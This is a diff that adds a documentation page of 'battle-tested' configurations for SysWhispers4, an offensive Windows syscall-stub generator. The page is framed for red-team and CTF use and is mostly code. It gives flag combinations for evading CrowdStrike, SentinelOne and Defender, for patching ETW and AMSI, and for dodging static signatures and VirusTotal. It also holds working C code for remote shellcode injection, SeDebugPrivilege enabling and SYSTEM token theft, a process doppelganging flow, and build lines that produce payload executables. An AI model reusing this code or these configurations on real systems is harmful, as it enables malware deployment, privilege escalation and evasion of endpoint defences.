@@ -1,0 +1,601 @@
+---
+title: Recommended Configurations
+description: Battle-tested configurations for different engagement scenarios
+---
+
+## Overview
+
+SysWhispers4 offers 8 SSN resolution methods, 4 invocation techniques, and 8 evasion options. This guide provides proven configurations for common scenarios.
+
+## Quick Reference
+
+| Scenario | Command | Detection Resistance | Speed |
+|----------|---------|:-------------------:|:-----:|
+| [Red Team (Maximum)](#red-team-maximum-evasion) | `--preset stealth` + all flags | ★★★★★ | ★★☆☆☆ |
+| [Heavy EDR Bypass](#bypassing-heavily-hooked-edr) | `--resolve from_disk` | ★★★★★ | ★★★☆☆ |
+| [CTF / Quick Test](#ctf-quick-testing) | `--preset common` | ★★★☆☆ | ★★★★★ |
+| [Static Analysis Evasion](#static-analysis-evasion) | `--method egg` | ★★★★☆ | ★★★☆☆ |
+| [Process Injection](#process-injection) | `--preset injection` | ★★★★☆ | ★★★★☆ |
+| [Token Manipulation](#token-manipulation) | `--preset token` | ★★★☆☆ | ★★★★★ |
+| [Process Doppelganging](#process-doppelganging) | `--preset transaction` | ★★★★☆ | ★★★☆☆ |
+
+---
+
+## Red Team (Maximum Evasion)
+
+### Use Case
+- Long-term persistent access
+- Bypass modern EDR (CrowdStrike, SentinelOne, Defender ATP)
+- Avoid behavioral detection heuristics
+- Red team assessments with strict rules of engagement
+
+### Configuration
+
+```bash
+python syswhispers.py --preset stealth \
+    --method randomized --resolve recycled \
+    --obfuscate --encrypt-ssn --stack-spoof \
+    --unhook-ntdll --etw-bypass --amsi-bypass \
+    --anti-debug --sleep-encrypt
+```
+
+### What It Does
+
+| Flag | Purpose | Impact |
+|------|---------|--------|
+| `--preset stealth` | 32 functions for injection + evasion + unhooking | Comprehensive coverage |
+| `--method randomized` | Random ntdll gadget per call (64 gadget pool) | Defeats pattern analysis |
+| `--resolve recycled` | FreshyCalls + opcode validation (maximum hook resistance) | Bypasses all hook types |
+| `--obfuscate` | Stub reordering + 14 junk instruction variants | Breaks signatures |
+| `--encrypt-ssn` | XOR-encrypted SSN table at rest | No plaintext SSNs in binary |
+| `--stack-spoof` | Synthetic ntdll return addresses | Clean call stack |
+| `--unhook-ntdll` | Remap clean `.text` from `\KnownDlls` | Removes all inline hooks |
+| `--etw-bypass` | Patch `EtwEventWrite` → `STATUS_ACCESS_DENIED` | Suppress user-mode ETW |
+| `--amsi-bypass` | Patch `AmsiScanBuffer` → `E_INVALIDARG` | Bypass AMSI scans |
+| `--anti-debug` | 6 debugger/analysis checks | Detect debugging attempts |
+| `--sleep-encrypt` | Ekko-style `.text` encryption during sleep | Evade memory scanners |
+
+### Integration Example
+
+```c
+#include "SW4Syscalls.h"
+
+int main(void) {
+    // Step 1: Remove all hooks (call BEFORE Initialize)
+    SW4_UnhookNtdll();
+    
+    // Step 2: Resolve SSNs dynamically
+    if (!SW4_Initialize()) {
+        return 1;
+    }
+    
+    // Step 3: Apply evasion patches
+    SW4_PatchEtw();     // Suppress ETW events
+    SW4_PatchAmsi();    // Bypass AMSI
+    
+    // Step 4: Verify clean environment
+    if (!SW4_AntiDebugCheck()) {
+        // Debugger detected - abort or take evasive action
+        return 0;
+    }
+    
+    // Step 5: Use syscalls directly
+    PVOID base = NULL;
+    SIZE_T size = 0x1000;
+    NTSTATUS st = SW4_NtAllocateVirtualMemory(
+        GetCurrentProcess(), &base, 0, &size,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
+    );
+    
+    // Use encrypted sleep instead of Sleep()
+    SW4_SleepEncrypt(5000);  // .text encrypted during sleep
+    
+    return NT_SUCCESS(st) ? 0 : 1;
+}
+```
+
+### Build (MSVC)
+
+```bash
+cl /O2 /GS- /DNDEBUG main.c SW4Syscalls.c SW4Syscalls.asm /link /OUT:payload.exe
+```
+
+---
+
+## Bypassing Heavily Hooked EDR
+
+### Use Case
+- CrowdStrike Falcon hooks every `Nt*` function
+- SentinelOne deep instrumentation
+- Multiple security products on same endpoint
+- Need guaranteed clean SSN resolution
+
+### Configuration
+
+```bash
+python syswhispers.py --preset injection \
+    --method indirect --resolve from_disk \
+    --unhook-ntdll --encrypt-ssn
+```
+
+### Why This Works
+
+**Problem:** EDR hooks every `Nt*` stub in the loaded ntdll:
+```asm
+ntdll!NtAllocateVirtualMemory:
+    E9 XX XX XX XX    ; JMP to EDR handler ← Hooked!
+```
+
+**Solution:** `--resolve from_disk` maps a **clean copy** from `\KnownDlls\ntdll.dll`:
+```c
+// Flow:
+NtOpenSection("\KnownDlls\ntdll.dll")  // Clean unhooked copy
+→ NtMapViewOfSection()                   // Map into our process
+→ Read SSNs from clean .text             // No hooks present
+→ NtUnmapViewOfSection()                 // Cleanup
+```
+
+The EDR never sees our SSN reads because we're reading from an **unhooked disk copy**.
+
+### Integration
+
+```c
+#include "SW4Syscalls.h"
+
+int main(void) {
+    // Optional: Remove existing hooks first
+    SW4_UnhookNtdll();  // Maps clean ntdll and overwrites hooked .text
+    
+    // Initialize with from_disk resolver
+    // This reads from a DIFFERENT clean copy (doesn't rely on unhooking)
+    if (!SW4_Initialize()) {
+        return 1;
+    }
+    
+    // All calls now use clean SSNs + indirect gadgets in ntdll
+    PVOID mem = NULL;
+    SIZE_T sz = 0x1000;
+    SW4_NtAllocateVirtualMemory(GetCurrentProcess(), &mem, 0, &sz,
+                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    
+    return 0;
+}
+```
+
+---
+
+## CTF / Quick Testing
+
+### Use Case
+- Capture The Flag competitions
+- Local privilege escalation testing
+- Quick prototyping
+- Learning syscall techniques
+
+### Configuration
+
+```bash
+python syswhispers.py --preset common
+```
+
+### What You Get
+
+- **25 functions**: Process/thread/memory operations
+- **Default resolver**: FreshyCalls (sort-by-VA, works on most systems)
+- **Default method**: Embedded direct syscall (fastest)
+- **No evasion overhead**: Clean, minimal code
+
+### Functions Included
+
+```c
+// Memory
+NtAllocateVirtualMemory, NtFreeVirtualMemory, NtWriteVirtualMemory,
+NtReadVirtualMemory, NtProtectVirtualMemory, NtQueryVirtualMemory
+
+// Process/Thread
+NtCreateThreadEx, NtOpenProcess, NtOpenThread, NtSuspendThread,
+NtResumeThread, NtGetContextThread, NtSetContextThread,
+NtTerminateProcess, NtTerminateThread
+
+// Section
+NtCreateSection, NtMapViewOfSection, NtUnmapViewOfSection
+
+// Other
+NtClose, NtDuplicateObject, NtWaitForSingleObject,
+NtQueryInformationProcess, NtSetInformationProcess,
+NtQuerySystemInformation, NtDelayExecution
+```
+
+### Build (MinGW)
+
+```bash
+x86_64-w64-mingw32-gcc -O2 -masm=intel \
+    main.c SW4Syscalls.c SW4Syscalls_stubs.c \
+    -o exploit.exe -lntdll
+```
+
+---
+
+## Static Analysis Evasion
+
+### Use Case
+- Bypass sandbox static analysis
+- Evade AV signature scans
+- Submit to VirusTotal without immediate detection
+- Avoid on-disk `syscall` opcode signatures
+
+### Configuration
+
+```bash
+python syswhispers.py --preset injection \
+    --method egg --resolve halos_gate \
+    --obfuscate
+```
+
+### How It Works
+
+**At compile time:**
+```asm
+; Instead of:
+syscall               ; 0F 05 ← Detectable!
+
+; Egg hunt generates:
+db 0A1h, 0B2h, 0C3h, 0D4h, 0E5h, 0F6h, 07h, 08h  ; Random 8-byte egg
+```
+
+**At runtime:**
+```c
+SW4_HatchEggs();  // Scans .text, replaces each egg with 0F 05 90 90 90 90 90 90
+```
+
+**Result:** `syscall` opcode never appears in the on-disk binary.
+
+### Integration
+
+```c
+#include "SW4Syscalls.h"
+
+int main(void) {
+    // CRITICAL: Hatch eggs before any syscall
+    SW4_HatchEggs();    // Replace egg markers with syscall opcodes
+    
+    // Now initialize SSN resolution
+    if (!SW4_Initialize()) {
+        return 1;
+    }
+    
+    // Syscalls now functional
+    HANDLE hProc;
+    OBJECT_ATTRIBUTES oa = {sizeof(oa)};
+    CLIENT_ID cid = {0};
+    cid.UniqueProcess = (HANDLE)1234;
+    
+    SW4_NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &oa, &cid);
+    SW4_NtClose(hProc);
+    
+    return 0;
+}
+```
+
+### Verification
+
+```bash
+# Before execution - no syscall opcode
+xxd payload.exe | grep "0f 05"
+# (no output)
+
+# After SW4_HatchEggs() - opcodes present in memory only
+```
+
+---
+
+## Process Injection
+
+### Use Case
+- Shellcode injection
+- APC injection
+- Section-based injection
+- Thread hijacking
+
+### Configuration
+
+```bash
+python syswhispers.py --preset injection \
+    --method indirect --resolve tartarus
+```
+
+### Functions Included
+
+```c
+// Memory management
+NtAllocateVirtualMemory, NtFreeVirtualMemory, NtWriteVirtualMemory,
+NtReadVirtualMemory, NtProtectVirtualMemory
+
+// Thread operations
+NtCreateThreadEx, NtOpenThread, NtSuspendThread, NtResumeThread,
+NtGetContextThread, NtSetContextThread
+
+// APC injection
+NtQueueApcThread, NtQueueApcThreadEx, NtAlertResumeThread, NtTestAlert
+
+// Section mapping
+NtCreateSection, NtMapViewOfSection, NtUnmapViewOfSection
+
+// Process access
+NtOpenProcess, NtClose
+```
+
+### Classic Injection Example
+
+```c
+#include "SW4Syscalls.h"
+
+int inject_shellcode(DWORD target_pid, unsigned char* shellcode, SIZE_T sc_len) {
+    HANDLE hProc;
+    OBJECT_ATTRIBUTES oa = {sizeof(oa)};
+    CLIENT_ID cid = {0};
+    cid.UniqueProcess = (HANDLE)(ULONG_PTR)target_pid;
+    
+    // 1. Open target process
+    NTSTATUS st = SW4_NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &oa, &cid);
+    if (!NT_SUCCESS(st)) return 0;
+    
+    // 2. Allocate memory
+    PVOID remote_mem = NULL;
+    SIZE_T region_size = sc_len;
+    st = SW4_NtAllocateVirtualMemory(hProc, &remote_mem, 0, &region_size,
+                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!NT_SUCCESS(st)) {
+        SW4_NtClose(hProc);
+        return 0;
+    }
+    
+    // 3. Write shellcode
+    st = SW4_NtWriteVirtualMemory(hProc, remote_mem, shellcode, sc_len, NULL);
+    if (!NT_SUCCESS(st)) {
+        SW4_NtFreeVirtualMemory(hProc, &remote_mem, &region_size, MEM_RELEASE);
+        SW4_NtClose(hProc);
+        return 0;
+    }
+    
+    // 4. Change to RX
+    ULONG old_protect;
+    st = SW4_NtProtectVirtualMemory(hProc, &remote_mem, &region_size,
+                                     PAGE_EXECUTE_READ, &old_protect);
+    
+    // 5. Create remote thread
+    HANDLE hThread;
+    st = SW4_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc,
+                              remote_mem, NULL, 0, 0, 0, 0, NULL);
+    
+    if (NT_SUCCESS(st)) {
+        SW4_NtClose(hThread);
+    }
+    
+    SW4_NtClose(hProc);
+    return NT_SUCCESS(st);
+}
+```
+
+---
+
+## Token Manipulation
+
+### Use Case
+- Privilege escalation
+- Token impersonation
+- SeDebugPrivilege enablement
+- SYSTEM token theft
+
+### Configuration
+
+```bash
+python syswhispers.py --preset token \
+    --method indirect --resolve freshycalls
+```
+
+### Enable SeDebugPrivilege
+
+```c
+#include "SW4Syscalls.h"
+
+BOOL enable_debug_privilege(void) {
+    HANDLE hToken;
+    NTSTATUS st;
+    
+    // Open current process token
+    st = SW4_NtOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
+    if (!NT_SUCCESS(st)) return FALSE;
+    
+    // Prepare privilege structure
+    TOKEN_PRIVILEGES tp = {0};
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid.LowPart = 20;  // SE_DEBUG_PRIVILEGE
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    
+    // Adjust privileges
+    st = SW4_NtAdjustPrivilegesToken(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+    
+    SW4_NtClose(hToken);
+    return NT_SUCCESS(st);
+}
+```
+
+### Token Impersonation
+
+```c
+BOOL steal_system_token(DWORD system_pid) {
+    HANDLE hProc, hToken, hDupToken;
+    OBJECT_ATTRIBUTES oa = {sizeof(oa)};
+    CLIENT_ID cid = {0};
+    cid.UniqueProcess = (HANDLE)(ULONG_PTR)system_pid;
+    
+    // Open SYSTEM process
+    NTSTATUS st = SW4_NtOpenProcess(&hProc, PROCESS_QUERY_INFORMATION, &oa, &cid);
+    if (!NT_SUCCESS(st)) return FALSE;
+    
+    // Open process token
+    st = SW4_NtOpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken);
+    SW4_NtClose(hProc);
+    if (!NT_SUCCESS(st)) return FALSE;
+    
+    // Duplicate token
+    SECURITY_QUALITY_OF_SERVICE sqos = {sizeof(sqos), SecurityImpersonation, FALSE, FALSE};
+    oa.SecurityQualityOfService = &sqos;
+    
+    st = SW4_NtDuplicateToken(hToken, TOKEN_ALL_ACCESS, &oa, FALSE,
+                              TokenImpersonation, &hDupToken);
+    SW4_NtClose(hToken);
+    if (!NT_SUCCESS(st)) return FALSE;
+    
+    // Impersonate
+    st = SW4_NtImpersonateThread(GetCurrentThread(), GetCurrentThread(), &sqos);
+    SW4_NtClose(hDupToken);
+    
+    return NT_SUCCESS(st);
+}
+```
+
+---
+
+## Process Doppelganging
+
+### Use Case
+- Execute code without creating suspicious process create events
+- Bypass application whitelisting
+- Evade process creation monitoring
+
+### Configuration
+
+```bash
+python syswhispers.py --preset transaction \
+    --method indirect --resolve freshycalls
+```
+
+### Functions Included
+
+```c
+NtCreateTransaction    // Create NTFS transaction
+NtRollbackTransaction  // Rollback (delete file after load)
+NtCommitTransaction    // Commit (persist file)
+NtCreateSection        // Map transacted file
+NtCreateProcessEx      // Create process from section
+NtCreateThreadEx       // Start execution
+NtClose                // Cleanup
+```
+
+### Basic Flow
+
+```c
+// 1. Create transaction
+HANDLE hTransaction;
+SW4_NtCreateTransaction(&hTransaction, ...);
+
+// 2. Create file in transaction context
+HANDLE hFile;
+SW4_NtCreateFile(&hFile, ..., hTransaction);
+
+// 3. Write payload to file
+SW4_NtWriteFile(hFile, payload, payload_size, ...);
+
+// 4. Create section from transacted file
+HANDLE hSection;
+SW4_NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
+                    PAGE_READONLY, SEC_IMAGE, hFile);
+
+// 5. Create process from section
+HANDLE hProcess;
+SW4_NtCreateProcessEx(&hProcess, ..., hSection, ...);
+
+// 6. Rollback transaction (file disappears!)
+SW4_NtRollbackTransaction(hTransaction, TRUE);
+
+// 7. Create thread in new process
+HANDLE hThread;
+SW4_NtCreateThreadEx(&hThread, ..., hProcess, entrypoint, ...);
+
+// Process is now running, but original file was never committed to disk
+```
+
+---
+
+## Architecture-Specific Configs
+
+### ARM64 (Windows on ARM)
+
+```bash
+python syswhispers.py --preset common --arch arm64
+```
+
+Generates ARM64 assembly using `SVC #0` instruction with syscall number in `w8` register.
+
+### x86 (32-bit)
+
+```bash
+python syswhispers.py --preset injection --arch x86
+```
+
+Uses `sysenter` instruction instead of `syscall`.
+
+### WoW64 (32-bit on 64-bit Windows)
+
+```bash
+python syswhispers.py --preset common --arch wow64
+```
+
+Implements Heaven's Gate transition to execute 64-bit syscalls from 32-bit code.
+
+---
+
+## Compiler-Specific Builds
+
+### MSVC (Default)
+
+```bash
+python syswhispers.py --preset common
+cl main.c SW4Syscalls.c SW4Syscalls.asm /link /OUT:main.exe
+```
+
+Requires MASM enabled in Visual Studio: **Project → Build Customizations → masm**
+
+### MinGW
+
+```bash
+python syswhispers.py --preset common --compiler mingw
+x86_64-w64-mingw32-gcc -masm=intel main.c SW4Syscalls.c SW4Syscalls_stubs.c -o main.exe
+```
+
+Uses GAS inline assembly instead of separate `.asm` file.
+
+### Clang
+
+```bash
+python syswhispers.py --preset common --compiler clang
+clang -target x86_64-pc-windows-msvc -masm=intel main.c SW4Syscalls.c SW4Syscalls_stubs.c -o main.exe
+```
+
+---
+
+## Performance Comparison
+
+| Configuration | Initialization Time | Per-Call Overhead | Binary Size |
+|---------------|:------------------:|:-----------------:|:-----------:|
+| `--resolve static` | ~1 µs | None | +8 KB |
+| `--resolve freshycalls` | ~200 µs | None | +12 KB |
+| `--resolve from_disk` | ~5 ms | None | +15 KB |
+| `--method embedded` | — | None | Baseline |
+| `--method indirect` | +50 µs (gadget search) | ~2 cycles | +2 KB |
+| `--method randomized` | +50 µs | ~8 cycles (RDTSC) | +4 KB |
+| `--sleep-encrypt` | — | ~500 µs/sleep | +6 KB |
+
+<Note>
+Times measured on Intel i7-10700K @ 3.8GHz, Windows 11 23H2. Your mileage may vary.
+</Note>
+
+---
+
+## Next Steps
+
+- [EDR Detection Vectors](/advanced/edr-detection) - Understand what each method evades
+- [ETW-Ti Limitations](/advanced/etw-ti-limitations) - Learn kernel-level detection boundaries
+- [Syscall Table Updates](/advanced/syscall-table-updates) - Keep tables current with j00ru's repo
